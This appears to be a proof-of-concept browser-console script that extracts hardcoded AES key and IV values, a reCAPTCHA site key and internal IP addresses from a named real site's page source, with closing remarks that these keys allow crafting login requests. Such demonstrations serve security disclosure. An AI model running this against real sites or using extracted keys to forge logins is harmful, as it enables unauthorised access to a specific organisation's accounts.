// GHRIETN Browser Console Demo
// Paste this into the browser console on ghrietn.cybervidya.net
// to extract the hardcoded encryption keys in real-time

console.log("=" .repeat(60));
console.log("GHRIETN Encryption Key Extractor");
console.log("=" .repeat(60));
console.log("");

// Search for hardcoded keys in the loaded JavaScript bundles
const pageContent = document.documentElement.innerHTML;

const keyMatch = pageContent.match(/cipherkey\s*[:=]\s*"([^"]+)"/);
const ivMatch = pageContent.match(/cipheriv\s*[:=]\s*"([^"]+)"/);
const siteKeyMatch = pageContent.match(/siteKey\s*[:=]\s*"([^"]+)"/);
const internalIPMatch = pageContent.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);

if (keyMatch) {
    console.log("✅ Found hardcoded AES key:");
    console.log(`   cipherkey: "${keyMatch[1]}"`);
    console.log("");
} else {
    console.log("❌ cipherkey not found (may be obfuscated)");
}

if (ivMatch) {
    console.log("✅ Found hardcoded IV:");
    console.log(`   cipheriv: "${ivMatch[1]}"`);
    console.log("");
} else {
    console.log("❌ cipheriv not found");
}

if (siteKeyMatch) {
    console.log("✅ Found reCAPTCHA site key:");
    console.log(`   siteKey: "${siteKeyMatch[1]}"`);
    console.log("");
}

if (internalIPMatch) {
    const privateIPs = internalIPMatch.filter(ip => {
        const parts = ip.split('.').map(Number);
        return (parts[0] === 10) ||
               (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
               (parts[0] === 192 && parts[1] === 168);
    });
    
    if (privateIPs.length > 0) {
        console.log("⚠️  Found internal IP addresses (information disclosure):");
        [...new Set(privateIPs)].forEach(ip => console.log(`   ${ip}`));
        console.log("");
    }
}

console.log("=" .repeat(60));
console.log("SECURITY IMPLICATION:");
console.log("Anyone with browser DevTools can extract these keys");
console.log("and craft valid login requests without the real frontend.");
console.log("This is NOT encryption - it's public obfuscation.");
console.log("=" .repeat(60));